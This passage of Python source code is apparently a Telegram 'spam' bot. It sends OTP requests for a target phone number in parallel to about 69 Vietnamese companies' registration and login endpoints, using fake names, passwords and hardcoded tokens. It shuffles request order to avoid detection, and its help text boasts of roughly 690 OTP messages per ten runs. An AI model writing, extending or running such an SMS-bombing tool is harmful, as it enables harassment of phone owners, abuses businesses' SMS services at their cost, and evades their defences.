        s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'})
        r = s.get('https://id.viettelpost.vn/Account/Register', timeout=8)
        m = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', r.text)
        token = m.group(1) if m else ''
        cookies = s.cookies.get_dict()
    except Exception:
        token = ''
        cookies = {}
        s = requests.Session()

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'null',
        'Referer': 'https://id.viettelpost.vn/Account/Register',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    data = {
        'FormRegister.FullName': 'Taylor Jasmine',
        'FormRegister.Phone': phone,
        'FormRegister.Password': 'vjyy1234',
        'FormRegister.ConfirmPassword': 'vjyy1234',
        'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=s7oqj3gkapi06ddxfymrhcs',
        'ConfirmOtpType': 'Register',
        'FormRegister.IsRegisterFromPhone': 'true',
        '__RequestVerificationToken': token,
    }
    s.post('https://id.viettelpost.vn/Account/SendOTPByPhone', cookies=cookies, headers=headers, data=data, timeout=8)

def shine(phone):
    headers = {
        'accept': 'application/json',
        'authorization': '',
        'content-type': 'application/json',
        'origin': 'https://30shine.com',
        'referer': 'https://30shine.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'phone': phone}
    requests.post('https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send', headers=headers, json=json_data, timeout=8)

def dkimu(phone):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
        'Content-Type': 'application/json',
        'Origin': 'https://mutosi.com',
        'Referer': 'https://mutosi.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {
        'name': 'hà khải',
        'phone': phone,
        'password': 'Vjyy1234@',
        'confirm_password': 'Vjyy1234@',
        'firstname': None,
        'lastname': None,
        'verify_otp': 0,
        'store_token': '226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
        'email': 'dd@gmail.com',
        'birthday': '2006-02-13',
        'accept_the_terms': 1,
        'receive_promotion': 1,
    }
    requests.post('https://api-omni.mutosi.com/client/auth/register', headers=headers, json=json_data, timeout=8)

def otpmu(phone):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
        'Content-Type': 'application/json',
        'Origin': 'https://mutosi.com',
        'Referer': 'https://mutosi.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {
        'phone': phone,
        'token': '03AFcWeA4O6j16gs8gKD9Zvb-gkvoC-kBTVH1xtMZrMmjfODRDkXlTkAzqS6z0cT_96PI4W-sLoELf2xrLnCpN0YvCs3q90pa8Hq52u2dIqknP5o7ZY-5isVxiouDyBbtPsQEzaVdXm0KXmAYPn0K-wy1rKYSAQWm96AVyKwsoAlFoWpgFeTHt_-J8cGBmpWcVcmOPg-D4-EirZ5J1cAGs6UtmKW9PkVZRHHwqX-tIv59digmt-KuxGcytzrCiuGqv6Rk8H52tiVzyNTtQRg6JmLpxe7VCfXEqJarPiR15tcxoo1RamCtFMkwesLd39wHBDHxoyiUah0P4NLbqHU1KYISeKbGiuZKB2baetxWItDkfZ5RCWIt5vcXXeF0TF7EkTQt635L7r1wc4O4p1I-vwapHFcBoWSStMOdjQPIokkGGo9EE-APAfAtWQjZXc4H7W3Aaj0mTLpRpZBV0TE9BssughbVXkj5JtekaSOrjrqnU0tKeNOnGv25iCg11IplsxBSr846YvJxIJqhTvoY6qbpFZymJgFe53vwtJhRktA3jGEkCFRdpFmtw6IMbfgaFxGsrMb2wkl6armSvVyxx9YKRYkwNCezXzRghV8ZtLHzKwbFgA6ESFRoIHwDIRuup4Da2Bxq4f2351XamwzEQnha6ekDE2GJbTw',
        'source': 'web_consumers',
    }
    requests.post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone', headers=headers, json=json_data, timeout=8)

def cathay(phone):
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://www.cathaylife.com.vn',
        'Referer': 'https://www.cathaylife.com.vn/CPWeb/html/CP/Z1/CPZ1_0100/CPZ10110.html',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
    }
    data = {
        'memberMap': '{"userName":"trongkhai611@gmail.com","password":"ditmetzk","birthday":"19/07/1988","certificateNumber":"001088647384","phone":"' + phone + '","email":"trongkhai611@gmail.com","LINK_FROM":"signUp2","memberID":"","CUSTOMER_NAME":"NGUYỄN HUY HOÀNG"}',
        'OTP_TYPE': 'P',
        'LANGS': 'vi_VN',
    }
    requests.post('https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP', headers=headers, data=data, timeout=8)

def vina(phone):
    headers = {
        'accept': '*/*',
        'authorization': 'Bearer null',
        'content-type': 'text/plain;charset=UTF-8',
        'origin': 'https://new.vinamilk.com.vn',
        'referer': 'https://new.vinamilk.com.vn/account/register',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    data = '{"type":"register","phone":"' + phone + '"}'
    requests.post('https://new.vinamilk.com.vn/api/account/getotp', headers=headers, data=data, timeout=8)

def air(phone):
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://vietair.com.vn',
        'referer': f'https://vietair.com.vn/khach-hang-than-quen/xac-nhan-otp-dang-ky?sq_id=30149&mobile={phone}',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {
        'op': 'PACKAGE_HTTP_POST',
        'path_ajax_post': '/service03/sms/get',
        'package_name': 'PK_FD_SMS_OTP',
        'object_name': 'INS',
        'P_MOBILE': phone,
        'P_TYPE_ACTIVE_CODE': 'DANG_KY_NHAN_OTP',
    }
    requests.post('https://vietair.com.vn/Handler/CoreHandler.ashx', headers=headers, data=data, timeout=8)

def fa(phone):
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.fahasa.com',
        'referer': 'https://www.fahasa.com/customer/account/login/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {'phone': phone}
    requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', headers=headers, data=data, timeout=8)

def sapo(phone):
    headers = {
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.sapo.vn',
        'referer': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    data = {'phonenumber': phone}
    requests.post('https://www.sapo.vn/fnb/sendotp', headers=headers, data=data, timeout=8)

# ── NGUỒN MỚI ──────────────────────────────────────────────────────────────────

def tiki(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://tiki.vn',
        'referer': 'https://tiki.vn/account/login',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-guest-token': '',
    }
    json_data = {'phone': phone, 'type': 'REGISTER'}
    requests.post('https://api.tiki.vn/account/v2/auth/otp', headers=headers, json=json_data, timeout=8)

def sendo(phone):
    headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://www.sendo.vn',
        'referer': 'https://www.sendo.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'phone_number': phone, 'type': 1}
    requests.post('https://id.sendo.vn/v2/auth/otp/send', headers=headers, json=json_data, timeout=8)

def ghtk(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://khachhang.giaohangtietkiem.vn',
        'referer': 'https://khachhang.giaohangtietkiem.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'phone': phone, 'is_shop': True}
    requests.post('https://services.giaohangtietkiem.vn/services/shipment/v2/get_otp_register', headers=headers, json=json_data, timeout=8)

def vieon(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://vieon.vn',
        'referer': 'https://vieon.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-platform': 'web',
    }
    json_data = {'phone_number': phone, 'platform': 'web', 'type': 'REGISTER'}
    requests.post('https://api.vieon.vn/api/user/v4/otp/request', headers=headers, json=json_data, timeout=8)

def guardian(phone):
    headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://www.guardian.com.vn',
        'referer': 'https://www.guardian.com.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'mobilePhone': phone, 'type': 'REGISTER'}
    requests.post('https://api.guardian.com.vn/api/v1/member/otp/send', headers=headers, json=json_data, timeout=8)

def ankhang(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://nhathuocankhang.com',
        'referer': 'https://nhathuocankhang.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'phone': phone, 'type': 'register', 'channel': 'WEB'}
    requests.post('https://api.nhathuocankhang.com/api/v1/auth/otp/request', headers=headers, json=json_data, timeout=8)

def topzone(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'apptenantid': 'F1E58C0A-5B2A-4B0A-8C1B-7D3E9F2A6B4D',
        'order-channel': '1',
        'origin': 'https://topzone.vn',
        'referer': 'https://topzone.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'fromSys': 'WEBKHTZ', 'otpType': '0', 'phoneNumber': phone}
    requests.post('https://papi.topzone.vn/gw/is/user/new-send-verification', headers=headers, json=json_data, timeout=8)

def coolmate(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://www.coolmate.me',
        'referer': 'https://www.coolmate.me/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'phone': phone, 'type': 'register'}
    requests.post('https://api.coolmate.me/api/v1/auth/otp/send', headers=headers, json=json_data, timeout=8)

def highlands(phone):
    headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://highlandscoffee.com.vn',
        'referer': 'https://highlandscoffee.com.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'phoneNumber': phone, 'actionType': 'REGISTER'}
    requests.post('https://api.highlandscoffee.com.vn/api/v1/auth/send-otp', headers=headers, json=json_data, timeout=8)

def hasaki(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://hasaki.vn',
        'referer': 'https://hasaki.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'phone': phone, 'type': 1}
    requests.post('https://hasaki.vn/api/v3/customer/sendOtpRegister', headers=headers, json=json_data, timeout=8)

def juno(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://juno.vn',
        'referer': 'https://juno.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'phone': phone, 'type': 'REGISTER'}
    requests.post('https://api.juno.vn/v1/auth/otp/send', headers=headers, json=json_data, timeout=8)

def canifa(phone):
    headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://canifa.com',
        'referer': 'https://canifa.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'phone': phone, 'otpType': 'REGISTER'}
    requests.post('https://api.canifa.com/api/v1/auth/otp', headers=headers, json=json_data, timeout=8)

def elise(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://elise.vn',
        'referer': 'https://elise.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'phone_number': phone, 'type': 'REGISTER'}
    requests.post('https://api.elise.vn/v1/auth/send-otp', headers=headers, json=json_data, timeout=8)

def bskin(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://bskin.com.vn',
        'referer': 'https://bskin.com.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'phone': phone, 'action': 'register'}
    requests.post('https://api.bskin.com.vn/api/v1/auth/send-otp', headers=headers, json=json_data, timeout=8)

def bookingcare(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://bookingcare.vn',
        'referer': 'https://bookingcare.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'phone': phone, 'type': 'register'}
    requests.post('https://bookingcare.vn/api/v3/auth/otp', headers=headers, json=json_data, timeout=8)

def mytour(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://mytour.vn',
        'referer': 'https://mytour.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'phone': phone}
    requests.post('https://api.mytour.vn/v2/auth/send-otp-register', headers=headers, json=json_data, timeout=8)

def vietnamworks(phone):
    headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://www.vietnamworks.com',
        'referer': 'https://www.vietnamworks.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'phone': phone, 'channel': 'sms'}
    requests.post('https://ms.vietnamworks.com/auth/v1.0/otp/send', headers=headers, json=json_data, timeout=8)

def topcv(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://www.topcv.vn',
        'referer': 'https://www.topcv.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'phone': phone, 'type': 'register'}
    requests.post('https://www.topcv.vn/api/auth/send-otp', headers=headers, json=json_data, timeout=8)

def nganluong(phone):
    headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://www.nganluong.vn',
        'referer': 'https://www.nganluong.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'phone_number': phone, 'action': 'register'}
    requests.post('https://www.nganluong.vn/api/v3/auth/otp/request', headers=headers, json=json_data, timeout=8)

def cellphones(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://cellphones.com.vn',
        'referer': 'https://cellphones.com.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-source': 'website',
    }
    json_data = {'phone_number': phone, 'type': 'REGISTER'}
    requests.post('https://api.cellphones.com.vn/v2/auth/send-otp', headers=headers, json=json_data, timeout=8)

def zingid(phone):
    # ZingID/VNG account OTP
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://accounts.zing.vn',
        'referer': 'https://accounts.zing.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'phone': phone, 'type': 'register', 'service': 'zing'}
    requests.post('https://accounts.zing.vn/api/v1/otp/phone/send', headers=headers, json=json_data, timeout=8)

def muabannhanh(phone):
    headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://muabannhanh.com',
        'referer': 'https://muabannhanh.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'phone': phone, 'action': 'register'}
    requests.post('https://muabannhanh.com/api/v1/sms/send-otp', headers=headers, json=json_data, timeout=8)

def jtexpress(phone):
    headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://jtexpress.vn',
        'referer': 'https://jtexpress.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'phone': phone, 'type': 'REGISTER', 'country': 'VN'}
    requests.post('https://www.jtexpress.vn/api/v1/auth/otp/send', headers=headers, json=json_data, timeout=8)

def ninjavan(phone):
    headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://www.ninjavan.co',
        'referer': 'https://www.ninjavan.co/vi-vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-country': 'VN',
    }
    json_data = {'contact': phone, 'type': 'PHONE', 'purpose': 'REGISTRATION'}
    requests.post('https://api.ninjavan.co/vn/core/auth/otp', headers=headers, json=json_data, timeout=8)

def thegioilamdep(phone):
    # Thế giới làm đẹp (TGLB)
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://thegioilamdep.com',
        'referer': 'https://thegioilamdep.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'phone': phone, 'type': 'REGISTER'}
    requests.post('https://api.thegioilamdep.com/v1/auth/otp/send', headers=headers, json=json_data, timeout=8)

# ─── FUNCTION LIST ─────────────────────────────────────────────────────────────
ALL_FUNCTIONS = [
    tv360, robot, fb, dvcd, myvt, phar, fptshop, meta, blu,
    tgdt, concung, mocha, money, winmart, alf, phuc, emart, hana,
    kingz, med, ghn, gala, ahamove, lon, medi, acfc, lote, domi,
    fu, beau, hoanvu, tokyo, cir, guma, hoang, fm, vtpost, shine,
    dkimu, otpmu, cathay, vina, air, fa, sapo,
    # nguồn mới (+23)
    tiki, sendo, ghtk, vieon, guardian, ankhang, topzone, coolmate,
    highlands, hasaki, juno, canifa, elise, bskin, bookingcare,
    mytour, vietnamworks, topcv, nganluong, cellphones,
    zingid, muabannhanh, jtexpress, ninjavan, thegioilamdep,
]
SITE_NAMES = [fn.__name__ for fn in ALL_FUNCTIONS]

# ─── USER REGISTRY ─────────────────────────────────────────────────────────────
all_users: set[int] = set()

# ─── HELPERS ───────────────────────────────────────────────────────────────────
def is_admin(user_id: int) -> bool:
    return user_id in ADMINS

async def check_member(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    for gid in (GROUP_ID, GROUP_ID2):
        try:
            m = await context.bot.get_chat_member(gid, user_id)
            if m.status not in ("member", "administrator", "creator", "restricted"):
                return False
        except Exception:
            return False
    return True

def is_group_chat(update: Update) -> bool:
    chat = update.effective_chat
    return chat is not None and (
        getattr(chat, "username", None) == GROUP_ID2.lstrip("@")
        or str(chat.id) == GROUP_ID2
    )

def _call_all(phone: str) -> int:
    """
    Gọi tất cả functions song song.
    ── FIX: shuffle để pattern request khó detect hơn mỗi round ──
    """
    ok = 0
    fns = ALL_FUNCTIONS.copy()
    random.shuffle(fns)
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futures = {ex.submit(fn, phone): fn.__name__ for fn in fns}
        for f in concurrent.futures.as_completed(futures):
            try:
                f.result()
                ok += 1
            except Exception:
                pass
    return ok

async def _spam_loop(phone: str, rounds: int, delay_between: float) -> int:
    loop = asyncio.get_event_loop()
    total_ok = 0
    for i in range(rounds):
        ok = await loop.run_in_executor(None, partial(_call_all, phone))
        total_ok += ok
        if delay_between > 0 and i < rounds - 1:
            await asyncio.sleep(delay_between)
    return total_ok

def main_menu(is_adm: bool) -> InlineKeyboardMarkup:
    kb = [
        [InlineKeyboardButton("📨 Spam", callback_data="menu_spam")],
        [InlineKeyboardButton("💬 Hỗ trợ", url=f"https://t.me/{SUPPORT_USERNAME.lstrip('@')}")],
    ]
    if is_adm:
        kb.insert(1, [InlineKeyboardButton("👑 Thêm Admin", callback_data="menu_addadmin")])
    return InlineKeyboardMarkup(kb)

def menu_text(user, is_adm: bool) -> str:
    name = user.full_name
    role = "👑 Admin" if is_adm else "👤 Thành viên"
    return (
        f"👋 Xin chào *{name}*!\n"
        f"🏷 Vai trò: {role}\n\n"
        f"📋 *Menu chính:*"
    )

# ─── /start ────────────────────────────────────────────────────────────────────
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    adm = is_admin(user.id)
    all_users.add(user.id)

    if not adm:
        joined = await check_member(user.id, context)
        if not joined:
            kb = [
                [InlineKeyboardButton("✅ Tham gia nhóm 1", url=GROUP_LINK)],
                [InlineKeyboardButton("✅ Tham gia nhóm 2", url=GROUP_LINK2)],
            ]
            await update.message.reply_text(
                f"⚠️ Bạn cần tham gia *cả hai nhóm* trước khi dùng bot!\n\n"
                f"1️⃣ {GROUP_LINK}\n"
                f"2️⃣ {GROUP_LINK2}\n\n"
                "Sau khi tham gia, nhấn /start lại.",
                reply_markup=InlineKeyboardMarkup(kb),
                parse_mode="Markdown"
            )
            return

    await update.message.reply_text(
        menu_text(user, adm),
        reply_markup=main_menu(adm),
        parse_mode="Markdown"
    )

# ─── /help ─────────────────────────────────────────────────────────────────────
async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    adm = is_admin(user.id)
    text = (
        "📖 *Hướng dẫn sử dụng*\n\n"
        "1️⃣ Nhấn *Spam* trong menu\n"
        "2️⃣ Nhập số điện thoại cần spam\n"
        "3️⃣ Bot tự động gửi vào *69 nguồn* cùng lúc\n"
        "4️⃣ Mỗi lần spam ≈ 69 OTP → 10 lần = ~690 OTP\n\n"
    )
    if adm:
        text += (
            "👑 *Quyền Admin:*\n"
            "• Spam không giới hạn số lần, không delay\n"
            "• /addadmin <user_id> — thêm admin\n"
            "• /tb <nội dung> — broadcast tới TẤT CẢ user từng /start\n"
        )
    else:
        text += (
            f"⚠️ *Giới hạn:* {USER_MAX_SPAM} lần/ngày\n"
            f"⏱ Delay giữa các lần: {USER_DELAY_SEC}s\n"
        )
    await update.message.reply_text(text, parse_mode="Markdown",
        reply_markup=main_menu(adm))

# ─── /addadmin ─────────────────────────────────────────────────────────────────
async def addadmin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_admin(user.id):
        await update.message.reply_text("❌ Chỉ admin mới dùng được lệnh này.")
        return
    if not context.args:
        await update.message.reply_text("Cú pháp: /addadmin <user_id>")
        return
    try:
        new_id = int(context.args[0])
        ADMINS.add(new_id)
        await update.message.reply_text(f"✅ Đã thêm admin: `{new_id}`", parse_mode="Markdown")
    except ValueError:
        await update.message.reply_text("❌ user_id phải là số nguyên.")

# ─── /tb — admin broadcast ─────────────────────────────────────────────────────
async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_admin(user.id):
        await update.message.reply_text("❌ Chỉ admin mới dùng được lệnh này.")
        return
    if not context.args:
        await update.message.reply_text(
            "Cú pháp: /tb <nội dung thông báo>\n"
            "Ví dụ: /tb Bot sẽ bảo trì lúc 22h tối nay!"
        )
        return

    msg = " ".join(context.args)
    text = f"📢 *Thông báo từ Admin:*\n\n{msg}"
    targets = list(all_users)
    ok = 0
    fail = 0
    for uid in targets:
        try:
            await context.bot.send_message(chat_id=uid, text=text, parse_mode="Markdown")
            ok += 1
        except Exception:
            fail += 1
    await update.message.reply_text(
        f"✅ Đã gửi: *{ok}* người\n❌ Thất bại: *{fail}*",
        parse_mode="Markdown"
    )

# ─── CALLBACK QUERY ────────────────────────────────────────────────────────────
async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user
    adm = is_admin(user.id)
    data = query.data

    if data == "menu_spam":
        if not adm:
            if not is_group_chat(update):
                kb = [[InlineKeyboardButton("💬 Vào nhóm chat", url=GROUP_LINK2)]]
                await query.edit_message_text(
                    f"⚠️ Vui lòng sử dụng tính năng này tại nhóm chat!\n\n"
                    f"👉 {GROUP_LINK2}",
                    reply_markup=InlineKeyboardMarkup(kb)
                )
                return
            joined = await check_member(user.id, context)
            if not joined:
                kb = [
                    [InlineKeyboardButton("✅ Tham gia nhóm 1", url=GROUP_LINK)],
                    [InlineKeyboardButton("✅ Tham gia nhóm 2", url=GROUP_LINK2)],
                ]
                await query.edit_message_text(
                    f"⚠️ Bạn cần tham gia *cả hai nhóm* trước!\n\n"
                    f"1️⃣ {GROUP_LINK}\n2️⃣ {GROUP_LINK2}",
                    reply_markup=InlineKeyboardMarkup(kb),
                    parse_mode="Markdown"
                )
                return
            used = spam_count.get(user.id, 0)
            if used >= USER_MAX_SPAM:
                await query.edit_message_text(
                    f"❌ Bạn đã dùng hết {USER_MAX_SPAM} lần spam hôm nay.\n"
                    f"Liên hệ {SUPPORT_USERNAME} để được hỗ trợ.",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("🔙 Menu", callback_data="menu_back")
                    ]])
                )
                return

        await query.edit_message_text(
            "📱 Nhập số điện thoại cần spam:",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("❌ Huỷ", callback_data="menu_back")
            ]])
        )
        context.user_data["state"] = "waiting_phone"
        return

    if data == "menu_addadmin":
        if not adm:
            await query.answer("Không có quyền.", show_alert=True)
            return
        await query.edit_message_text(
            "Gõ lệnh: /addadmin <user_id>",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔙 Menu", callback_data="menu_back")
            ]])
        )
        return

    if data == "menu_back":
        await query.edit_message_text(
            menu_text(user, adm),
            reply_markup=main_menu(adm),
            parse_mode="Markdown"
        )
        return

    if data == "spam_confirm":
        phone = context.user_data.get("pending_phone")
        if not phone:
            await query.edit_message_text("❌ Lỗi. Thử lại từ menu.")
            return

        await query.edit_message_text(f"⏳ Đang spam `{phone}`...", parse_mode="Markdown")

        status = await context.bot.send_message(
            chat_id=query.message.chat_id,
            text=f"🚀 Bắt đầu spam `{phone}`...",
            parse_mode="Markdown"
        )

